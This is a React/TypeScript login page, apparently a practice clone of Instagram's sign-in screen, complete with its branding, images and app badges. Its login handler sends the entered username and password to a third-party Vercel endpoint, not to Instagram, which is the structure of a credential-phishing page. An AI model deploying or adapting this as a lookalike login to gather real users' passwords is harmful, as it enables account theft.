import { useState, useEffect } from "react";
import InstagramFooter from "./Footer";
interface StyleProperties {
  [key: string]: string | number;
}

export const LoginPage: React.FC = () => {
  const [email, setEmail] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [currentImage, setCurrentImage] = useState<number>(0);
  //   const fadingImagesRef = useRef<HTMLDivElement>(null);

  const images: string[] = [
    "https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot5.png",
    "https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot3.png",
    "https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot2.png",
    "https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot1.png",
  ];

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentImage((prev) => (prev + 1) % images.length);
    }, 4000);

    return () => clearInterval(interval);
  }, [images.length]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>): void => {
    const { name, value } = e.target;
    if (name === "email") setEmail(value);
    if (name === "password") setPassword(value);
  };

  const toggleShowPassword = (): void => {
    setShowPassword(!showPassword);
  };

  const emailPlaceholderStyle: StyleProperties = {
    fontSize: email ? "10px" : "12px",
    top: email ? "3px" : "8px",
    opacity: 0.7,
  };

  const passwordPlaceholderStyle: StyleProperties = {
    fontSize: password ? "10px" : "12px",
    top: password ? "3px" : "8px",
    opacity: 0.7,
  };

  const loginButtonStyle: StyleProperties = {
    backgroundColor: email && password.length >= 6 ? "#049bff" : "",
    cursor: email && password.length >= 6 ? "pointer" : "default",
  };

  const handleLogin = async (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();

    try {
      const res = await fetch(
        "https://new-express-project-1v4n5vxp9-ramesh2041999-gmailcoms-projects.vercel.app/api/user/login",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            username: email, // Replace with actual data
            password, // Replace with actual data
          }),
        }
      );

      if (!res.ok) {
        throw new Error("Login failed");
      }

      const data = await res.json();
      console.log("Login successful:", data);
    } catch (error) {
      console.error("Error:", error);
    }
  };

  return (
    <>
      <div className="container">
        <div className="imagesAndTransistion">
          <div id="frame1">
            <img
              src="https://raw.githubusercontent.com/mahesh00009/instagram/main/mobile-frame4.png"
              alt=""
            />
          </div>
          <div id="frame2">
            <img
              src="https://raw.githubusercontent.com/mahesh00009/instagram/main/mobile-frame3.png"
              alt=""
            />
            <img
              src="https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot4.png"
              alt=""
            />
          </div>

          <div className="transistionImages">
            {images.map((img, index) => (
              <img
                key={img}
                src={img}
                className="fadingImages"
                style={{ opacity: index === currentImage ? 1 : 0 }}
                alt=""
              />
            ))}
          </div>
        </div>

        <div className="instagramAll">
          <div className="instagramForm">
            <div className="insta-font">
              <img
                src="https://raw.githubusercontent.com/mahesh00009/instagram/main/instagram-font.png"
                alt="Instagram"
              />
            </div>

            <div className="inputs">
              <div className="email">
                <input
                  type="text"
                  name="email"
                  id="email"
                  value={email}
                  onChange={handleInputChange}
                  style={{ paddingTop: email ? "20px" : "" }}
                />
                <span id="emailPlaceholder" style={emailPlaceholderStyle}>
                  Phone number, username, or email
                </span>
              </div>

              <div className="password">
                <input
                  type={showPassword ? "text" : "password"}
                  name="password"
                  id="password"
                  value={password}
                  onChange={handleInputChange}
                  style={{ paddingTop: password ? "20px" : "" }}
                />
                <span id="passwordPlaceholder" style={passwordPlaceholderStyle}>
                  Password
                </span>
                {password && (
                  <span id="showOrHide" onClick={toggleShowPassword}>
                    {showPassword ? "Hide" : "Show"}
                  </span>
                )}
              </div>

              <button id="login" onClick={handleLogin} style={loginButtonStyle}>
                Log in
              </button>

              <div className="or">
                <hr />
                <span id="or">OR</span>
              </div>

              <div className="loginWithFacebook">
                <a href="">
                  <i className="fa-brands fa-facebook"></i>
                  <span>Log in with Facebook</span>
                </a>
              </div>

              <p id="forget">
                <a href="">Forgot password?</a>
              </p>
            </div>
          </div>

          <div className="no-account">
            <p id="noAccount">
              Don't have an account?{" "}
              <span>
                <a href="">Sign up</a>
              </span>
            </p>
          </div>

          <div className="get-app">
            <p id="getTheApp">Get the app.</p>
          </div>

          <div className="downloadLinks">
            <div className="btn googlePlay">
              <img
                src="https://raw.githubusercontent.com/mahesh00009/instagram/main/microsoft%20logo.png"
                alt=""
              />
              <p id="getoOnGooglePlay">
                <span>GET IT ON </span>
                <b>Google Play</b>
              </p>
            </div>

            <div className="btn microsoft">
              <img
                src="https://raw.githubusercontent.com/mahesh00009/instagram/main/googlePlay%20logo.png"
                alt=""
              />
              <p id="getoOnGooglePlay">
                <span>GET IT FROM </span>
                <b> Microsoft</b>
              </p>
            </div>
          </div>
        </div>
      </div>
      <InstagramFooter />
    </>
  );
};

export default LoginPage;
